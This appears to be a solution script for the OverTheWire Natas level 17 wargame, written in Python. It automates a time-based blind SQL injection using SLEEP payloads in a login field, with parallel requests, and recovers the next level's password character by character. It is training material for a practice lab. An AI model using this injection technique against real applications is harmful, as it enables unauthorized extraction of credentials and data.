import requests
from requests.auth import HTTPBasicAuth
import string
from concurrent.futures import ThreadPoolExecutor

url = 'http://natas17.natas.labs.overthewire.org/'
# The credentials for auth in the level
username = 'natas17'
password = 'passwordPlaceholder'

# The characters to check in the password
alphanumeric = string.ascii_letters + string.digits

current_password = ""
last_password = None

time_sleep = 10

# Function to send a POST request with form data
def send_request(current_password, char):
    try:
        form_data = {'username': 'natas18" AND password LIKE BINARY "' + current_password + char + '%" AND SLEEP('+ str(time_sleep) +')#'}
        response = requests.post(url, data=form_data, auth=HTTPBasicAuth(username, password))
        response_time= response.elapsed.total_seconds();

        if response_time >= time_sleep :
            print(f"\n{current_password + char} | Response Time: {response_time}s")
            return True, char
        else:
            return False, char

    except requests.exceptions.RequestException as e:
        return False, None

# Function to perform multiple requests in parallel
def perform_parallel_requests(current_password):
    # Create a ThreadPoolExecutor to handle multiple requests in parallel
    with ThreadPoolExecutor(max_workers= len(alphanumeric)) as executor:
        # Submit request for each character
        futures = [executor.submit(send_request, current_password, char) for char in alphanumeric]

        # Wait for all futures to complete and collect results
        for future in futures:
            user_exists, char = future.result()
            if user_exists:
                    return current_password + char
        return current_password

# Build password
while current_password != last_password:
    last_password = current_password
    current_password = perform_parallel_requests(current_password)

print(current_password)